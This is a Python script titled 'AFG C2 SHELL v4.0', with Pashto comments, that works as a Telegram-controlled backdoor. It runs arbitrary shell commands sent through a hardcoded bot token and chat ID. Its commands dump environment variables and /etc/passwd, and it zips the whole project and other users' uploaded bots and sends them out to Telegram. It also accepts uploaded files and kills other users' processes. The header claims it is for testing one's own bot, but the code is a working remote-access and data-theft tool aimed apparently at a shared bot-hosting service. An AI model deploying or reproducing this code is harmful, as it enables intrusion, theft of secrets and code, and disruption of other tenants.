#!/usr/bin/env python3
"""
🔥 AFG C2 SHELL v4.0 - بشپړ پرمختللی
ستاسو د خپل بوټ د امنیتي ازموینې لپاره
"""

import os, subprocess, requests, socket, json, time, sys, shutil, zipfile, tempfile, io

# ==================== تشکیلات ====================
BOT_TOKEN = "8744655561:AAHgpYjtkyvmW7rBM8InLnC3MyiLQ0GBa54"
CHAT_ID = "6379929132"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
BASE_DIR = "/opt/render/project/src"
# =================================================

LAST_UPDATE_ID = 0
current_dir = BASE_DIR
shell_mode = False

def api_call(method, **kwargs):
    """د ټیلیګرام API ته غوښتنه"""
    try:
        url = f"{API_URL}/{method}"
        resp = requests.post(url, timeout=60, **kwargs)
        return resp.json()
    except Exception as e:
        print(f"API Error: {e}")
        return None

def send_message(text):
    """اوږده پیغامونه ماتوي او لېږي"""
    try:
        for part in [text[i:i+4000] for i in range(0, len(text), 4000)]:
            api_call("sendMessage", json={"chat_id": CHAT_ID, "text": part, "parse_mode": "HTML"})
            time.sleep(0.3)
    except:
        for part in [text[i:i+4000] for i in range(0, len(text), 4000)]:
            try:
                api_call("sendMessage", json={"chat_id": CHAT_ID, "text": part})
            except:
                pass
            time.sleep(0.3)

def send_file(filepath, caption=""):
    """فایل ټیلیګرام ته لېږي"""
    try:
        if not os.path.exists(filepath):
            return False
        with open(filepath, 'rb') as f:
            api_call("sendDocument", 
                    data={"chat_id": CHAT_ID, "caption": caption[:200] if caption else ""},
                    files={"document": (os.path.basename(filepath), f)})
        time.sleep(1)
        return True
    except Exception as e:
        print(f"File send error: {e}")
        return False

def send_big_file(filepath, caption=""):
    """لوی فایل (تر 50MB) ټیلیګرام ته لېږي"""
    try:
        if not os.path.exists(filepath):
            send_message(f"❌ فایل وجود نلري: {filepath}")
            return False
        
        file_size = os.path.getsize(filepath)
        file_size_mb = file_size / (1024 * 1024)
        
        if file_size_mb > 49:
            send_message(f"⚠️ فایل {file_size_mb:.1f}MB دی. ټیلیګرام تر 50MB اجازه ورکوي. هڅه کوم...")
        
        with open(filepath, 'rb') as f:
            api_call("sendDocument",
                    data={"chat_id": CHAT_ID, "caption": caption[:200] if caption else ""},
                    files={"document": (os.path.basename(filepath), f)})
        time.sleep(2)
        return True
    except Exception as e:
        send_message(f"❌ د لوی فایل لېږلو خطا: {e}")
        return False

def run_cmd(cmd, timeout=30):
    """شیل کمانډ اجرا کوي"""
    global current_dir
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, cwd=current_dir
        )
        out = result.stdout.strip()
        err = result.stderr.strip()
        response = ""
        if out:
            response += out
        if err:
            if response:
                response += "\n"
            response += f"⚠️ {err}"
        return response if response else "✅ اجرا شو"
    except subprocess.TimeoutExpired:
        return f"⏱️ وخت تېر شو ({timeout}s)"
    except Exception as e:
        return f"❌ {e}"

def get_updates():
    """د بوټ نوي پیغامونه ګوري"""
    global LAST_UPDATE_ID
    try:
        resp = api_call("getUpdates", params={
            "offset": LAST_UPDATE_ID + 1,
            "timeout": 30
        })
        if resp and resp.get("ok") and resp.get("result"):
            for upd in resp["result"]:
                LAST_UPDATE_ID = upd["update_id"]
                if "message" in upd:
                    msg = upd["message"]
                    if str(msg["chat"]["id"]) == CHAT_ID:
                        if "text" in msg:
                            return msg["text"].strip()
                        elif "document" in msg:
                            file_id = msg["document"]["file_id"]
                            file_name = msg["document"].get("file_name", "uploaded_file")
                            download_uploaded_file(file_id, file_name)
                            return None
        return None
    except:
        return None

def download_uploaded_file(file_id, file_name):
    """ټیلیګرام څخه فایل ډاونلوډوي"""
    try:
        file_info = api_call("getFile", params={"file_id": file_id})
        if file_info and file_info.get("ok"):
            file_path = file_info["result"]["file_path"]
            file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
            resp = requests.get(file_url, timeout=60)
            if resp.status_code == 200:
                save_path = os.path.join(current_dir, file_name)
                with open(save_path, 'wb') as f:
                    f.write(resp.content)
                send_message(f"✅ فایل اپلوډ شو: {save_path}")
        else:
            send_message("❌ د فایل ډاونلوډ پاتې راغی")
    except Exception as e:
        send_message(f"❌ فایل اپلوډ خطا: {e}")

def create_safe_zip(source_path, zip_name):
    """ZIP جوړوي د timestamp ستونزې حل سره"""
    temp_zip = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
    temp_zip.close()
    
    try:
        with zipfile.ZipFile(temp_zip.name, 'w', zipfile.ZIP_DEFLATED, strict_timestamps=False) as zf:
            if os.path.isfile(source_path):
                zf.write(source_path, os.path.basename(source_path))
            elif os.path.isdir(source_path):
                for root, dirs, files in os.walk(source_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            arcname = os.path.relpath(file_path, os.path.dirname(source_path))
                            zf.write(file_path, arcname)
                        except:
                            pass
        
        # کاپي یې destination ته
        dest = os.path.join(BASE_DIR, "inf", zip_name)
        shutil.copy2(temp_zip.name, dest)
        return dest
    finally:
        os.unlink(temp_zip.name)

def send_all_files_recursive(base_path, prefix=""):
    """ټول فایلونه په recursive ډول لېږي"""
    file_list = []
    
    if os.path.isfile(base_path):
        file_list.append(base_path)
    elif os.path.isdir(base_path):
        for root, dirs, files in os.walk(base_path):
            # .git او .venv پریږدئ (ډېر لوی دي)
            if '.git' in dirs:
                dirs.remove('.git')
            if '.venv' in dirs:
                dirs.remove('.venv')
            if '__pycache__' in dirs:
                dirs.remove('__pycache__')
            
            for file in files:
                file_path = os.path.join(root, file)
                # د ZIP فایلونه پریږدئ
                if not file.endswith('.zip'):
                    file_list.append(file_path)
    
    return file_list

def generate_file_map(base_path):
    """د ټولو فایلونو نقشه جوړوي (د Tree په څېر)"""
    tree_lines = []
    tree_lines.append(f"📂 {os.path.basename(base_path) or base_path}/")
    
    def add_tree(path, indent=""):
        try:
            items = sorted(os.listdir(path))
        except:
            return
        
        dirs = [d for d in items if os.path.isdir(os.path.join(path, d)) and d not in ['.git', '.venv', '__pycache__']]
        files = [f for f in items if os.path.isfile(os.path.join(path, f)) and not f.endswith('.zip')]
        
        for i, d in enumerate(dirs):
            is_last = (i == len(dirs) - 1) and (len(files) == 0)
            tree_lines.append(f"{indent}{'└── ' if is_last else '├── '}📁 {d}/")
            add_tree(os.path.join(path, d), indent + ("    " if is_last else "│   "))
        
        for i, f in enumerate(files):
            is_last = (i == len(files) - 1)
            file_path = os.path.join(path, f)
            try:
                size = os.path.getsize(file_path)
                size_str = f" ({size:,}B)" if size < 1024 else f" ({size/1024:.1f}KB)" if size < 1024*1024 else f" ({size/(1024*1024):.1f}MB)"
            except:
                size_str = ""
            tree_lines.append(f"{indent}{'└── ' if is_last else '├── '}📄 {f}{size_str}")
    
    add_tree(base_path)
    return "\n".join(tree_lines)

# ==================== کمانډ پروسیسر ====================
def process_command(cmd):
    global current_dir, shell_mode
    
    cmd_orig = cmd.strip()
    parts = cmd_orig.split(" ", 1)
    cmd_name = parts[0].lower()
    cmd_args = parts[1] if len(parts) > 1 else ""

    # ====== HELP ======
    if cmd_name in ["/help", "help", "/start"]:
        return f"""<b>🔥 AFG C2 SHELL v4.0</b>

<b>💻 عادي کمانډونه:</b>
<code>ls [مسیر]</code> - لارښود وګورئ
<code>cd &lt;مسیر&gt;</code> - لارښود بدل کړئ
<code>cat &lt;فایل&gt;</code> - فایل محتوا
<code>pwd</code> - اوسنی لارښود

<b>📁 فایل عملیات:</b>
<code>/dl &lt;فایل&gt;</code> - فایل ډاونلوډ
<code>/zip &lt;مسیر&gt;</code> - فولډر/فایل ZIP
<code>/zipall</code> - ټوله پروژه ZIP
<code>/zipbots</code> - د ټولو کاروونکو بوټونه ZIP
<code>/zipuser &lt;ID&gt;</code> - د یو کارن بوټونه ZIP
<code>/rm &lt;فایل&gt;</code> - حذف کول
<code>/upload &lt;فایل&gt;</code> - ټیلیګرام ته فایل اپلوډ (reply)

<b>🔥 <code>/allget</code> - د ټولو فایلونو نقشه + مکمل ZIP!</b>

<b>🔍 پلټنه:</b>
<code>/find &lt;نمونه&gt;</code> - د فایلونو پلټنه
<code>/grep &lt;متن&gt; &lt;فایل&gt;</code> - دننه پلټنه

<b>⚙️ سیسټم:</b>
<code>/info</code> - سیسټم معلومات
<code>/env</code> - چاپېریال متغیرات
<code>/ps</code> - روانې پروسې
<code>/net</code> - شبکې معلومات
<code>/ip</code> - عامه IP
<code>/passwd</code> - /etc/passwd

<b>👥 کاروونکي:</b>
<code>/who</code> - کاروونکي
<code>/allbots</code> - ټول بوټونه
<code>/kill &lt;PID&gt;</code> - پروسه وژني
<code>/killuser &lt;ID&gt;</code> - د کارن پروسې وژني

<b>📜 سرچینه:</b>
<code>/source</code> - Main.py
<code>/sourcefull</code> - Main.py ډاونلوډ

<b>🐚 <code>/shell</code> - شیل حالت</b>

📍 <b>اوسنی:</b> <code>{current_dir}</code>"""

    # ====== لارښود ======
    elif cmd_name == "ls":
        path = cmd_args if cmd_args else current_dir
        return run_cmd(f"ls -la {path}")
    
    elif cmd_name == "cd":
        if not cmd_args:
            return "❌ مسیر ورکړئ: cd <مسیر>"
        if cmd_args == "..":
            current_dir = os.path.dirname(current_dir)
        elif os.path.isdir(cmd_args):
            current_dir = os.path.abspath(cmd_args)
        elif os.path.isdir(os.path.join(current_dir, cmd_args)):
            current_dir = os.path.abspath(os.path.join(current_dir, cmd_args))
        else:
            return f"❌ لارښود پیدا نشو: {cmd_args}"
        return f"📁 {current_dir}"
    
    elif cmd_name == "pwd":
        return f"📁 {current_dir}"
    
    elif cmd_name == "cat":
        if not cmd_args:
            return "❌ cat <فایل>"
        path = cmd_args if os.path.isabs(cmd_args) else os.path.join(current_dir, cmd_args)
        try:
            with open(path, 'r', errors='ignore') as f:
                content = f.read()
            return f"📄 {path}:\n\n{content[:3800]}"
        except:
            return run_cmd(f"cat {path}")
    
    # ====== ډاونلوډ / ZIP ======
    elif cmd_name == "/dl":
        if not cmd_args:
            return "❌ /dl <فایل>"
        path = cmd_args if os.path.isabs(cmd_args) else os.path.join(current_dir, cmd_args)
        if os.path.exists(path):
            if send_file(path):
                return f"✅ {path}"
        return f"❌ وجود نلري: {path}"
    
    elif cmd_name == "/zip":
        if not cmd_args:
            return "❌ /zip <مسیر>"
        path = cmd_args if os.path.isabs(cmd_args) else os.path.join(current_dir, cmd_args)
        if os.path.exists(path):
            send_message(f"📦 د {path} ZIP کېږي...")
            zip_path = create_safe_zip(path, f"archive_{int(time.time())}.zip")
            if send_big_file(zip_path):
                os.remove(zip_path)
                return "✅ ZIP ولېږل شو"
        return f"❌ وجود نلري: {path}"
    
    elif cmd_name == "/zipall":
        send_message("📦 د ټولې پروژې ZIP کېږي (د .git او .venv پرته)...")
        zip_path = create_safe_zip(BASE_DIR, f"full_project_{int(time.time())}.zip")
        send_big_file(zip_path, "📦 بشپړه پروژه")
        os.remove(zip_path)
        return "✅ بشپړه پروژه ZIP شوه"
    
    elif cmd_name == "/zipbots":
        send_message("📦 د ټولو کاروونکو بوټونه ZIP کېږي...")
        bots_dir = os.path.join(BASE_DIR, "upload_bots")
        zip_path = create_safe_zip(bots_dir, f"all_bots_{int(time.time())}.zip")
        send_big_file(zip_path, "📦 د ټولو کاروونکو بوټونه")
        os.remove(zip_path)
        return "✅ د ټولو بوټونو ZIP ولېږل شو"
    
    elif cmd_name == "/zipuser":
        if not cmd_args:
            return "❌ /zipuser <user_id>"
        user_dir = os.path.join(BASE_DIR, "upload_bots", cmd_args)
        if os.path.isdir(user_dir):
            zip_path = create_safe_zip(user_dir, f"user_{cmd_args}_{int(time.time())}.zip")
            send_big_file(zip_path, f"📦 د کارن {cmd_args} بوټونه")
            os.remove(zip_path)
            return f"✅ د کارن {cmd_args} بوټونه ZIP شول"
        return f"❌ د کارن {cmd_args} لارښود پیدا نشو"
    
    # ====== ALLGET (نوی) ======
    elif cmd_name == "/allget":
        send_message("🗺️ د ټولو فایلونو نقشه جوړېږي...")
        
        # 1. د فایلونو نقشه
        file_map = generate_file_map(BASE_DIR)
        send_message(f"<b>🗺️ د پروژې د فایلونو نقشه:</b>\n<pre>{file_map[:3900]}</pre>")
        if len(file_map) > 3900:
            send_message(f"<pre>{file_map[3900:7800]}</pre>")
        
        # 2. د فایلونو شمېر
        all_files = send_all_files_recursive(BASE_DIR)
        total_files = len(all_files)
        total_size = sum(os.path.getsize(f) for f in all_files if os.path.isfile(f))
        send_message(f"📊 <b>ټولټال:</b> {total_files} فایلونه | {total_size/(1024*1024):.1f}MB")
        
        # 3. ZIP جوړول
        send_message("📦 د ټولو فایلونو ZIP جوړېږي...")
        zip_path = create_safe_zip(BASE_DIR, f"ALLGET_{int(time.time())}.zip")
        
        zip_size = os.path.getsize(zip_path) / (1024 * 1024)
        send_message(f"📦 ZIP اندازه: {zip_size:.1f}MB")
        
        # 4. لېږل
        if send_big_file(zip_path, f"🔥 ALLGET - بشپړه پروژه ({total_files} فایلونه, {total_size/(1024*1024):.1f}MB)"):
            os.remove(zip_path)
            return "✅ <b>/allget بشپړ شو!</b>\n🗺️ نقشه + 📦 ZIP ولېږل شول"
        else:
            os.remove(zip_path)
            return "❌ د ZIP لېږل پاتې راغلل"
    
    # ====== حذف ======
    elif cmd_name == "/rm":
        if not cmd_args:
            return "❌ /rm <فایل/مسیر>"
        path = cmd_args if os.path.isabs(cmd_args) else os.path.join(current_dir, cmd_args)
        if os.path.exists(path):
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path)
                else:
                    os.remove(path)
                return f"🗑️ حذف شو: {path}"
            except Exception as e:
                return f"❌ حذف خطا: {e}"
        return f"❌ وجود نلري: {path}"
    
    # ====== پلټنه ======
    elif cmd_name == "/find":
        if not cmd_args:
            return "❌ /find <نمونه>"
        return run_cmd(f"find {BASE_DIR} -name '*{cmd_args}*' -type f 2>/dev/null | head -30")
    
    elif cmd_name == "/grep":
        if len(parts) < 2 or " " not in cmd_args:
            return "❌ /grep <نمونه> <فایل>"
        pattern, filepath = cmd_args.split(" ", 1)
        return run_cmd(f"grep -n '{pattern}' {filepath} 2>/dev/null | head -30")
    
    # ====== معلومات ======
    elif cmd_name == "/info":
        disk = run_cmd("df -h /opt | tail -1")
        mem = run_cmd("free -h | grep Mem")
        return f"""<b>🔰 Hostname:</b> <code>{socket.gethostname()}</code>
<b>👤 User:</b> <code>{os.popen('whoami').read().strip()}</code>
<b>📋 UID:</b> <code>{os.getuid() if hasattr(os, 'getuid') else 'N/A'}</code>
<b>💻 OS:</b> <code>{(os.popen('uname -a').read().strip())[:80]}</code>
<b>📁 CWD:</b> <code>{os.getcwd()}</code>
<b>📁 Shell:</b> <code>{current_dir}</code>
<b>💾 Disk:</b> <code>{disk.strip()}</code>
<b>🧠 Memory:</b> <code>{mem.strip()}</code>"""
    
    elif cmd_name == "/env":
        return f"<b>🌍 Env Vars:</b>\n<pre>{os.popen('env').read().strip()[:3800]}</pre>"
    
    elif cmd_name == "/ps":
        return f"<b>🧹 Processes:</b>\n<pre>{run_cmd('ps aux --sort=-%mem | head -30')[:3800]}</pre>"
    
    elif cmd_name == "/net":
        return f"<b>🌐 Network:</b>\n<pre>{run_cmd('ip a 2>/dev/null || ifconfig')[:3800]}</pre>"
    
    elif cmd_name == "/ip":
        try:
            ip = requests.get("https://ifconfig.me", timeout=5).text.strip()
            ipdata = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
            return f"<b>🌍 IP:</b> <code>{ip}</code>\n<b>🏢 ISP:</b> <code>{ipdata.get('org', 'N/A')}</code>\n<b>📍 Location:</b> <code>{ipdata.get('city', 'N/A')}, {ipdata.get('country', 'N/A')}</code>"
        except:
            return run_cmd("curl -s ifconfig.me")
    
    elif cmd_name == "/passwd":
        try:
            with open("/etc/passwd", "r") as f:
                return f"<b>👥 Passwd:</b>\n<pre>{f.read()[:3800]}</pre>"
        except:
            return "❌ لاسرسی نلري"
    
    # ====== کاروونکي ======
    elif cmd_name == "/who":
        return f"<b>👥 کاروونکي:</b>\n<pre>{run_cmd(f'ls -la {BASE_DIR}/upload_bots/')}</pre>"
    
    elif cmd_name == "/allbots":
        return f"<b>🤖 ټول بوټونه:</b>\n<pre>{run_cmd(f'find {BASE_DIR}/upload_bots -name *.py -o -name *.js 2>/dev/null')}</pre>"
    
    elif cmd_name == "/kill":
        if not cmd_args:
            return "❌ /kill <PID>"
        return run_cmd(f"kill -9 {cmd_args}")
    
    elif cmd_name == "/killuser":
        if not cmd_args:
            return "❌ /killuser <user_id>"
        user_id = cmd_args
        result = run_cmd(f"ps aux | grep 'upload_bots/{user_id}' | grep -v grep | awk '{{print $2}}'")
        if result and "✅" not in result:
            pids = [p.strip() for p in result.split('\n') if p.strip()]
            for pid in pids:
                run_cmd(f"kill -9 {pid}")
            return f"☠️ د کارن {user_id} {len(pids)} پروسې ووژل شوې"
        return f"ℹ️ د کارن {user_id} لپاره هېڅ روانه پروسه نشته"
    
    # ====== سرچینه ======
    elif cmd_name == "/source":
        try:
            with open(os.path.join(BASE_DIR, "Main.py"), "r", errors='ignore') as f:
                return f"<b>📜 Main.py:</b>\n<pre>{f.read()[:3500]}</pre>"
        except:
            return "❌ Main.py پیدا نشو"
    
    elif cmd_name == "/sourcefull":
        path = os.path.join(BASE_DIR, "Main.py")
        if os.path.exists(path):
            send_file(path, "Main.py - Full Source Code")
            return "✅ Main.py ولېږل شو"
        return "❌ پیدا نشو"
    
    # ====== شیل حالت ======
    elif cmd_name == "/shell":
        shell_mode = True
        send_message(f"<b>🐚 شیل حالت فعال</b>\n📍 <code>{current_dir}</code>\n\nهر پیغام = شیل کمانډ\n<code>exit</code> = ختمول")
        return None
    
    elif cmd_name == "exit" and shell_mode:
        shell_mode = False
        return "🚪 شیل حالت ختم شو"
    
    # ====== اپلوډ ======
    elif cmd_name == "/upload":
        send_message("📤 فایل د reply په توګه ولېږئ (document)")
        return None
    
    else:
        return run_cmd(cmd_orig)

# ==================== اصلي لوپ ====================
def main():
    global shell_mode
    
    send_message(f"<b>🔥 AFG C2 SHELL v4.0</b>\n📍 <code>{BASE_DIR}</code>\n/help = کمانډونه\n/allget = ټول فایلونه نقشه + ZIP")
    
    while True:
        try:
            cmd = get_updates()
            if cmd:
                print(f"⚡ {cmd}")
                
                if shell_mode and cmd.lower() != "/shell":
                    if cmd.lower() == "exit":
                        shell_mode = False
                        send_message("🚪 شیل حالت ختم شو")
                    else:
                        result = run_cmd(cmd)
                        send_message(f"<pre>{cmd}</pre>\n\n{result}")
                else:
                    result = process_command(cmd)
                    if result:
                        send_message(result)
            
            time.sleep(0.5)
            
        except KeyboardInterrupt:
            send_message("🔴 بوټ وتړل شو.")
            sys.exit(0)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
